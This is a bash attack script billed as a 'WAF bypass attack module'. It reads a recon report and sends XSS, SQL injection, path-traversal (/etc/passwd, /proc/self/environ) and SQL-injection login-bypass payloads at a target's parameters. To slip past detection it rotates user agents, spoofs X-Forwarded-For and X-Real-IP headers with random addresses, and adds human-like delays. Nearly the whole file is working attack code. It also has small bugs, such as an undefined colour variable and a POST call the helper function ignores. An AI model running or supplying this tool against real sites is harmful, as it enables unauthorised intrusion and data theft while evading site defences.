#!/bin/bash
# waf_bypass.sh - WAF Evasion Attack Module
# Uses recon data to execute targeted curl attacks with anti‑WAF measures

# Colors
RED='\033[1;31m'; GRN='\033[1;32m'; YLW='\033[1;33m'
BLU='\033[1;34m'; CYN='\033[1;36m'; RST='\033[0m'

# ====== STEALTH FUNCTIONS (same as intelijen_v3) ======
random_ua() {
    local ua_list=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
        "Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0"
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
    )
    echo "${ua_list[$RANDOM % ${#ua_list[@]}]}"
}

random_ip() {
    echo "$((RANDOM%223+1)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))"
}

stealth_curl() {
    local url="$1"
    local ua=$(random_ua)
    local ip=$(random_ip)
    curl -s -L \
        -A "$ua" \
        -H "X-Forwarded-For: $ip" \
        -H "X-Real-IP: $ip" \
        -H "Accept-Language: en-US,en;q=0.9" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
        --connect-timeout 10 \
        --max-time 20 \
        "$url"
}

stealth_curl_metrics() {
    local url="$1"
    local ua=$(random_ua)
    local ip=$(random_ip)
    curl -s -o /dev/null -w "%{http_code} %{size_download}" \
        -A "$ua" \
        -H "X-Forwarded-For: $ip" \
        -H "X-Real-IP: $ip" \
        --connect-timeout 10 \
        --max-time 20 \
        "$url"
}

human_delay() {
    local base="${1:-3}"
    local jitter=$(( RANDOM % 5 ))
    local micro=$(( RANDOM % 999 ))
    local total=$(( base + jitter ))
    echo -e "${MAG}    [~] Sleeping ${total}.${micro}s${RST}"
    sleep "${total}.${micro}"
}

# ====== LOAD RECON DATA ======
LATEST_REPORT="./scan_logs/latest_report.json"
if [[ ! -f "$LATEST_REPORT" ]]; then
    echo -e "${RED}[!] No recon report found. Run recon_advisor.sh first.${RST}"
    exit 1
fi

TARGET=$(jq -r '.target' "$LATEST_REPORT")
WAF=$(jq -r '.waf_detected' "$LATEST_REPORT")
PARAMS=$(jq -r '.parameters' "$LATEST_REPORT" | tr ',' '\n')
DELAY_REC=$(jq -r '.recommended_delay' "$LATEST_REPORT" | grep -oE '[0-9]+' | head -1)
[[ -z "$DELAY_REC" ]] && DELAY_REC=3

echo -e "${CYN}[+] Loaded recon for: $TARGET${RST}"
echo -e "${YLW}[*] WAF detected: $WAF | Base delay: ${DELAY_REC}s${RST}"

# ====== ATTACK FUNCTIONS ======

# XSS test on all params
test_xss() {
    echo -e "\n${CYN}[+] XSS Testing on discovered parameters${RST}"
    local payloads=(
        "<script>alert(1)</script>"
        "%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E"
        "JDT\"><img src=x onerror=alert(1)>"
        "javascript:alert(1)"
    )
    for param in $PARAMS; do
        for payload in "${payloads[@]}"; do
            local url="${TARGET}?${param}=${payload}"
            echo -e "${YLW}    [*] Testing ${param}=${payload}${RST}"
            local response=$(stealth_curl "$url")
            if echo "$response" | grep -qi "alert\|<script\|onerror"; then
                echo -e "${RED}    [!!!] XSS POSSIBLE on ${param} with payload: ${payload}${RST}"
            fi
            human_delay $DELAY_REC
        done
    done
}

# SQLi test
test_sqli() {
    echo -e "\n${CYN}[+] SQLi Testing${RST}"
    local payloads=(
        "' OR '1'='1"
        "' OR 1=1--"
        "admin'--"
        "' UNION SELECT NULL,NULL,NULL--"
        "' AND SLEEP(5)--"
    )
    for param in $PARAMS; do
        local base_url="${TARGET}?${param}=test"
        local base_size=$(stealth_curl "$base_url" | wc -c)
        for payload in "${payloads[@]}"; do
            local url="${TARGET}?${param}=${payload}"
            local size=$(stealth_curl "$url" | wc -c)
            local diff=$((size - base_size))
            diff="${diff#-}"
            if [[ $diff -gt 200 ]]; then
                echo -e "${RED}    [!!!] SQLi ANOMALY on ${param} (size diff ${diff}B) with: ${payload}${RST}"
            else
                echo -e "    [*] ${param}=${payload} -> size diff ${diff}B"
            fi
            human_delay $DELAY_REC
        done
    done
}

# LFI test
test_lfi() {
    echo -e "\n${CYN}[+] LFI / Path Traversal Testing${RST}"
    local payloads=(
        "../../../etc/passwd"
        "../../../../etc/passwd"
        "/etc/passwd"
        "../../../windows/win.ini"
        "../../../../proc/self/environ"
    )
    for param in $PARAMS; do
        local base_url="${TARGET}?${param}=index"
        local base_size=$(stealth_curl "$base_url" | wc -c)
        for payload in "${payloads[@]}"; do
            local url="${TARGET}?${param}=${payload}"
            local response=$(stealth_curl "$url")
            local size=$(echo "$response" | wc -c)
            local diff=$((size - base_size))
            diff="${diff#-}"
            if [[ $diff -gt 500 ]] || echo "$response" | grep -qi "root:x\|\[extensions\]"; then
                echo -e "${RED}    [!!!] LFI LIKELY on ${param} with ${payload} (diff ${diff}B)${RST}"
            else
                echo -e "    [*] ${param}=${payload} -> diff ${diff}B"
            fi
            human_delay $DELAY_REC
        done
    done
}

# Login bypass
test_login() {
    echo -e "\n${CYN}[+] Login Bypass Testing (if login form found)${RST}"
    local login_url="${TARGET%/}/login.jsp"
    local login_forms=$(stealth_curl "$login_url" | grep -i "form.*action")
    if [[ -n "$login_forms" ]]; then
        echo -e "${YLW}    [*] Login form detected at $login_url${RST}"
        local bypass_payloads=(
            "admin'--"
            "admin' OR '1'='1"
            "admin' AND 1=1--"
        )
        for payload in "${bypass_payloads[@]}"; do
            echo -e "    [*] Trying username: $payload, password: anything"
            local result=$(stealth_curl -X POST -d "uid=${payload}&passw=x&btnSubmit=Login" "$login_url")
            if echo "$result" | grep -qi "welcome\|dashboard\|logout\|account"; then
                echo -e "${RED}    [!!!] LOGIN BYPASS with username: ${payload}${RST}"
            fi
            human_delay $DELAY_REC
        done
    else
        echo -e "    [*] No login.jsp found, skipping."
    fi
}

# ====== MAIN MENU ======
clear
echo -e "${BLU}========================================${RST}"
echo -e "${CYN}   WAF Bypass Attack Module${RST}"
echo -e "${BLU}========================================${RST}"
echo "1) XSS (all params)"
echo "2) SQL Injection"
echo "3) LFI / Path Traversal"
echo "4) Login Bypass"
echo "5) Run All Tests"
echo "6) Exit"
read -rp "Choice: " choice

case $choice in
    1) test_xss ;;
    2) test_sqli ;;
    3) test_lfi ;;
    4) test_login ;;
    5) test_xss; test_sqli; test_lfi; test_login ;;
    6) exit 0 ;;
    *) echo -e "${RED}Invalid choice${RST}"; exit 1 ;;
esac

echo -e "\n${GRN}[+] Attack module finished.${RST}"
